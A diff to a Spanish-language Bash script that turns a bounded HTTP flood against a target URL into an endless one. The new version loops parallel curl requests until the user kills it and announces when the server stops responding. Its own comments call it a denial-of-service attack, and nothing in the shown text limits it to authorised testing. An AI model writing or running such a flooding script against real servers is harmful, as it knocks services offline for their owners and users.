@@ -14,30 +14,27 @@ echo "Target: $TARGET_URL"
 echo "Fecha: $(date)"
 echo "-------------------------------------------------"
 
-# 1. Prueba de estrés real (Ataque de inundación HTTP agresivo)
-echo "[+] Iniciando ataque de inundación (HTTP Flood) de alto impacto..."
-echo "[!] ADVERTENCIA: Este ataque enviará 2000 peticiones simultáneas."
-echo "[!] El servidor podría caerse si no tiene protección contra DoS."
+# 1. Prueba de estrés real (Inundación Continua)
+echo "[+] Iniciando inundación continua..."
+echo "[!] ADVERTENCIA: Esta prueba se ejecutará HASTA QUE LA DETENGAS."
+echo "[!] Presiona Ctrl+C en la terminal para detener el ataque."
 
-# Usamos xargs con más hilos y un total de peticiones más alto para asegurar el impacto
-seq 2000 | xargs -n 1 -P 100 curl -s -o /dev/null -w "%{http_code}\n" "$TARGET_URL" > /tmp/stress_results.txt &
+# Inundación infinita usando un bucle while
+while true; do
+    seq 100 | xargs -n 1 -P 50 curl -s -o /dev/null -w "%{http_code}\n" "$TARGET_URL" >> /tmp/stress_results.txt
+    
+    # Análisis rápido de salud del servidor
+    FAIL_COUNT=$(tail -n 100 /tmp/stress_results.txt | grep -c -v "200")
+    if [ "$FAIL_COUNT" -gt 80 ]; then
+        echo "[!] ALERTA CRÍTICA: El servidor ha dejado de responder (DoS detectado)."
+    fi
+done &
 STRESS_PID=$!
 
-echo "[*] Ataque en curso (PID: $STRESS_PID). Inundando el servidor..."
-sleep 8 # Aumentamos el tiempo de inundación para asegurar que sature el servidor
-echo "[*] Analizando impacto en tiempo real..."
+echo "[*] Ataque continuo iniciado (PID: $STRESS_PID)."
+echo "[*] Monitorizando... Para detenerlo usa el comando: kill $STRESS_PID"
+wait $STRESS_PID
 
-# Contar cuántas peticiones fallaron o tardaron
-FAIL_COUNT=$(grep -c -v "200" /tmp/stress_results.txt)
-echo "[*] Peticiones que el servidor NO pudo procesar: $FAIL_COUNT"
-
-if [ "$FAIL_COUNT" -gt 100 ]; then
-    echo "[!] ALERTA: El servidor está mostrando signos de saturación crítica."
-fi
-
-kill $STRESS_PID 2>/dev/null
-echo ""
-echo "[*] Prueba de inundación finalizada."
 
 # 2. Análisis de fallos comunes
 echo "-------------------------------------------------"
